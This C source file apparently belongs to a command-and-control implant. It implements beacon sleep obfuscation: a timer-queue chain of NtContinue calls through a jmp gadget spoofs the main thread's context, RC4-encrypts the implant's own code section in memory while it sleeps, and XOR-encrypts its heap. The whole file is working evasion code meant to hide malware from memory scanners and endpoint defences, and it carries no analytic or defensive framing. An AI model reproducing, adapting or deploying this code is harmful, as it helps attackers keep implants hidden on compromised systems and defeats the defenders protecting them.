#include <windows.h>
#include <Native.h>
#include <Agent.h>
#include <Defines.h>
#include <Internals.h>

#define BEACON_XOR_KEY  0xC0FFEE1337DEADULL
#define BEACON_DELAY_MS 100

// FLAGS for SystemFunction040/041 (RtlEncryptMemory / RtlDecryptMemory)
// 0 = same-process decryption only (safest, default)
#define CRYPT_OPT_SAME_PROCESS 0

DECLFN void Beacon_Sleep( ULONG ms )
{
    G_AGENT;
    if ( ms == 0 ) return;

    // fallback: if gadget or cryptbase not set, heap-only mode
    // (happens if Init() couldn't find FF 23 in ntdll or cryptbase failed to load)
    if ( !Self->Config.JmpGadget || !Self->Cryptbase.SystemFunction040 )
    {
        HeapCrypt( BEACON_XOR_KEY );
        Self->Krnl32.Sleep( ms );
        HeapCrypt( BEACON_XOR_KEY );
        return;
    }

    // setup 
    HANDLE   Queue     = nullptr;
    HANDLE   Timer     = nullptr;
    HANDLE   EvCapture = nullptr;   // fires when RtlCaptureContext finishes
    HANDLE   EvStart   = nullptr;   // main thread signals this to start the chain
    HANDLE   EvEnd     = nullptr;   // chain signals this when done sleeping
    PVOID    OldProt   = nullptr;   // receives old page flags from VirtualProtect
    NTSTATUS st;

    // VirtualAlloc - NOT via Heap_Alloc so HeapCrypt never touches these.
    // If we used Heap_Alloc, HeapCrypt would XOR-encrypt Ctx/CtxBkp/CtxSpf before the
    // timers fire, so NtContinue would read encrypted garbage and crash.
    // VirtualAlloc also returns zeroed pages so no Mem_Set needed.
    CONTEXT* CtxCapture = (CONTEXT*)Self->Krnl32.VirtualAlloc( nullptr, sizeof(CONTEXT), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE );
    CONTEXT* CtxBkp     = (CONTEXT*)Self->Krnl32.VirtualAlloc( nullptr, sizeof(CONTEXT), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE );
    CONTEXT* CtxSpf     = (CONTEXT*)Self->Krnl32.VirtualAlloc( nullptr, sizeof(CONTEXT), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE );
    CONTEXT* Ctx        = (CONTEXT*)Self->Krnl32.VirtualAlloc( nullptr, 10 * sizeof(CONTEXT), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE );
    UINT16   ic         = 0;

    if ( !CtxCapture || !CtxBkp || !CtxSpf || !Ctx ) goto _fallback;

    // create three manual-reset events, initially non-signalled
    st  = Self->Ntdll.NtCreateEvent( &EvCapture, EVENT_ALL_ACCESS, nullptr, 1, FALSE );
    st |= Self->Ntdll.NtCreateEvent( &EvStart,   EVENT_ALL_ACCESS, nullptr, 1, FALSE );
    st |= Self->Ntdll.NtCreateEvent( &EvEnd,     EVENT_ALL_ACCESS, nullptr, 1, FALSE );

    if ( !NT_SUCCESS(st) || !EvCapture || !EvStart || !EvEnd ) goto _fallback;

    st = Self->Ntdll.RtlCreateTimerQueue( &Queue );
    if ( !NT_SUCCESS(st) || !Queue ) goto _fallback;

    // step 1: capture the timer pool thread's CONTEXT
    CtxCapture->ContextFlags = CONTEXT_ALL;
    st  = Self->Ntdll.RtlCreateTimer( Queue, &Timer,
            (PVOID)Self->Ntdll.RtlCaptureContext,
            CtxCapture, BEACON_DELAY_MS, 0, WT_EXECUTEINTIMERTHREAD );
    st |= Self->Ntdll.RtlCreateTimer( Queue, &Timer,
            (PVOID)Self->Krnl32.SetEvent,
            EvCapture, BEACON_DELAY_MS * 2, 0, WT_EXECUTEINTIMERTHREAD );

    if ( !NT_SUCCESS(st) ) goto _fallback;

    // wait for the capture to land
    Self->Ntdll.NtWaitForSingleObject( EvCapture, FALSE, nullptr );

    // build CtxSpf from CtxCapture (timer pool thread context).
    CtxBkp->ContextFlags = CONTEXT_ALL;
    Mem_Copy( CtxSpf, CtxCapture, sizeof(CONTEXT) );

    // step 2: build the execution chain
    // NtContinue → jmp [rbx] calls the target function with (Rcx, Rdx, R8, R9).
    for ( int i = 0; i < 10; i++ ) {
        Mem_Copy( &Ctx[i], CtxCapture, sizeof(CONTEXT) );
        Ctx[i].Rsp -= sizeof(PVOID);
    }

    #define CHAIN_CALL(idx, fn_ptr, a, b, c, d)            \
        Ctx[idx].Rip = (DWORD64)Self->Config.JmpGadget;    \
        Ctx[idx].Rbx = (DWORD64)&(fn_ptr);                 \
        Ctx[idx].Rcx = (DWORD64)(a);                       \
        Ctx[idx].Rdx = (DWORD64)(b);                       \
        Ctx[idx].R8  = (DWORD64)(c);                       \
        Ctx[idx].R9  = (DWORD64)(d)

    // 0 - wait for main thread to signal EvStart (sync point)
    CHAIN_CALL( ic, Self->Ntdll.NtWaitForSingleObject,
        EvStart, FALSE, 0, 0 );
    ic++;

    // 1 - save main thread's real context into CtxBkp
    // (main thread is now blocked in NtSignalAndWaitForSingleObject)
    CHAIN_CALL( ic, Self->Ntdll.NtGetContextThread,
        Self->Config.MainThreadHandle, CtxBkp, 0, 0 );
    ic++;

    // 2 - apply spoof: replace main thread's saved context with the timer thread's
    CHAIN_CALL( ic, Self->Ntdll.NtSetContextThread,
        Self->Config.MainThreadHandle, CtxSpf, 0, 0 );
    ic++;

    // 3 - change .text to RW so SystemFunction040 can write encrypted bytes
    CHAIN_CALL( ic, Self->Krnl32.VirtualProtect,
        Self->Base.Start, Self->Base.Length, PAGE_READWRITE, &OldProt );
    ic++;

    // 4 - RC4-encrypt the shellcode in place (SystemFunction040 = RtlEncryptMemory)
    CHAIN_CALL( ic, Self->Cryptbase.SystemFunction040,
        Self->Base.Start, Self->Base.Length, CRYPT_OPT_SAME_PROCESS, 0 );
    ic++;

    // 5 - the actual sleep: WaitForSingleObjectEx(current process, ms)
    CHAIN_CALL( ic, Self->Krnl32.WaitForSingleObjectEx,
        (HANDLE)(LONG_PTR)-1, ms, FALSE, 0 );
    ic++;

    // 6 - decrypt: SystemFunction041 = RtlDecryptMemory (symmetric reverse of 040)
    CHAIN_CALL( ic, Self->Cryptbase.SystemFunction041,
        Self->Base.Start, Self->Base.Length, CRYPT_OPT_SAME_PROCESS, 0 );
    ic++;

    // 7 - restore .text to RX
    CHAIN_CALL( ic, Self->Krnl32.VirtualProtect,
        Self->Base.Start, Self->Base.Length, PAGE_EXECUTE_READ, &OldProt );
    ic++;

    // 8 - restore main thread's real context BEFORE signaling EvEnd.
    CHAIN_CALL( ic, Self->Ntdll.NtSetContextThread,
        Self->Config.MainThreadHandle, CtxBkp, 0, 0 );
    ic++;

    // 9 - signal EvEnd to wake the main thread (main thread now has its real context)
    CHAIN_CALL( ic, Self->Krnl32.SetEvent, EvEnd, 0, 0, 0 );
    ic++;

    #undef CHAIN_CALL

    // step 3: schedule the chain
    {
        ULONG delay = BEACON_DELAY_MS * 3;  // start after capture + margin
        for ( UINT16 i = 0; i < ic; i++, delay += BEACON_DELAY_MS )
        {
            Self->Ntdll.RtlCreateTimer( Queue, &Timer,
                (PVOID)Self->Ntdll.NtContinue,
                &Ctx[i], delay, 0, WT_EXECUTEINTIMERTHREAD );
        }
    }

    // step 4: encrypt heap, trigger chain, wait
    HeapCrypt( BEACON_XOR_KEY );

    // When EvEnd fires our .text is already decrypted and RX again - safe to return into it.
    Self->Ntdll.NtSignalAndWaitForSingleObject( EvStart, EvEnd, FALSE, nullptr );

    // decrypt heap after chain restores .text
    HeapCrypt( BEACON_XOR_KEY );

    goto _cleanup;

_fallback:
    HeapCrypt( BEACON_XOR_KEY );
    Self->Krnl32.Sleep( ms );
    HeapCrypt( BEACON_XOR_KEY );

_cleanup:
    if ( Queue )     Self->Ntdll.RtlDeleteTimerQueue( Queue );
    if ( EvCapture ) Self->Ntdll.NtClose( EvCapture );
    if ( EvStart   ) Self->Ntdll.NtClose( EvStart   );
    if ( EvEnd     ) Self->Ntdll.NtClose( EvEnd     );
    if ( CtxCapture ) Self->Krnl32.VirtualFree( CtxCapture, 0, MEM_RELEASE );
    if ( CtxBkp     ) Self->Krnl32.VirtualFree( CtxBkp,    0, MEM_RELEASE );
    if ( CtxSpf     ) Self->Krnl32.VirtualFree( CtxSpf,    0, MEM_RELEASE );
    if ( Ctx        ) Self->Krnl32.VirtualFree( Ctx,        0, MEM_RELEASE );
}
